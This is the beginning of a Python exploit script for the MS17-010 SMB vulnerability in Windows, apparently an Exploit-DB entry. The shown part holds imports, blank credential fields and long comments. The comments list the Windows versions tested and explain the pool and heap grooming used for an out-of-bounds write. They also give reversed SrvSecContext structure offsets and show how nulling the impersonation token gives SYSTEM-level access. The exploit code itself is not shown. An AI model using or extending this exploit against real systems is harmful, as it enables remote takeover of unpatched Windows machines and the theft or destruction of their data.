#!/usr/bin/python
from impacket import smb, smbconnection
from mysmb import MYSMB
from struct import pack, unpack, unpack_from
import sys
import socket
import time

'''
MS17-010 exploit for Windows 2000 and later by sleepya

EDB Note: mysmb.py can be found here ~ https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/42315.py

Note:
- The exploit should never crash a target (chance should be nearly 0%)
- The exploit use the bug same as eternalromance and eternalsynergy, so named pipe is needed

Tested on:
- Windows 2016 x64
- Windows 10 Pro Build 10240 x64
- Windows 2012 R2 x64
- Windows 8.1 x64
- Windows 2008 R2 SP1 x64
- Windows 7 SP1 x64
- Windows 2008 SP1 x64
- Windows 2003 R2 SP2 x64
- Windows XP SP2 x64
- Windows 8.1 x86
- Windows 7 SP1 x86
- Windows 2008 SP1 x86
- Windows 2003 SP2 x86
- Windows XP SP3 x86
- Windows 2000 SP4 x86
'''

USERNAME = ''
PASSWORD = ''

'''
A transaction with empty setup:
- it is allocated from paged pool (same as other transaction types) on Windows 7 and later
- it is allocated from private heap (RtlAllocateHeap()) with no on use it on Windows Vista and earlier
- no lookaside or caching method for allocating it

Note: method name is from NSA eternalromance

For Windows 7 and later, it is good to use matched pair method (one is large pool and another one is fit
for freed pool from large pool). Additionally, the exploit does the information leak to check transactions
alignment before doing OOB write. So this exploit should never crash a target against Windows 7 and later.

For Windows Vista and earlier, matched pair method is impossible because we cannot allocate transaction size
smaller than PAGE_SIZE (Windows XP can but large page pool does not split the last page of allocation). But
a transaction with empty setup is allocated on private heap (it is created by RtlCreateHeap() on initialing server).
Only this transaction type uses this heap. Normally, no one uses this transaction type. So transactions alignment
in this private heap should be very easy and very reliable (fish in a barrel in NSA eternalromance). The drawback
of this method is we cannot do information leak to verify transactions alignment before OOB write.
So this exploit has a chance to crash target same as NSA eternalromance against Windows Vista and earlier.
'''

'''
Reversed from: SrvAllocateSecurityContext() and SrvImpersonateSecurityContext()
win7 x64
struct SrvSecContext {
	DWORD xx1; // second WORD is size
	DWORD refCnt;
	PACCESS_TOKEN Token;  // 0x08
	DWORD xx2;
	BOOLEAN CopyOnOpen; // 0x14
	BOOLEAN EffectiveOnly;
	WORD xx3;
	DWORD ImpersonationLevel; // 0x18
	DWORD xx4;
	BOOLEAN UsePsImpersonateClient; // 0x20
}
win2012 x64
struct SrvSecContext {
	DWORD xx1; // second WORD is size
	DWORD refCnt;
	QWORD xx2;
	QWORD xx3;
	PACCESS_TOKEN Token;  // 0x18
	DWORD xx4;
	BOOLEAN CopyOnOpen; // 0x24
	BOOLEAN EffectiveOnly;
	WORD xx3;
	DWORD ImpersonationLevel; // 0x28
	DWORD xx4;
	BOOLEAN UsePsImpersonateClient; // 0x30
}

SrvImpersonateSecurityContext() is used in Windows Vista and later before doing any operation as logged on user.
It called PsImperonateClient() if SrvSecContext.UsePsImpersonateClient is true. 
From https://msdn.microsoft.com/en-us/library/windows/hardware/ff551907(v=vs.85).aspx, if Token is NULL,
PsImperonateClient() ends the impersonation. Even there is no impersonation, the PsImperonateClient() returns
STATUS_SUCCESS when Token is NULL.
If we can overwrite Token to NULL and UsePsImpersonateClient to true, a running thread will use primary token (SYSTEM)
to do all SMB operations.
Note: for Windows 2003 and earlier, the exploit modify token user and groups in PCtxtHandle to get SYSTEM because only
  ImpersonateSecurityContext() is used in these Windows versions.
'''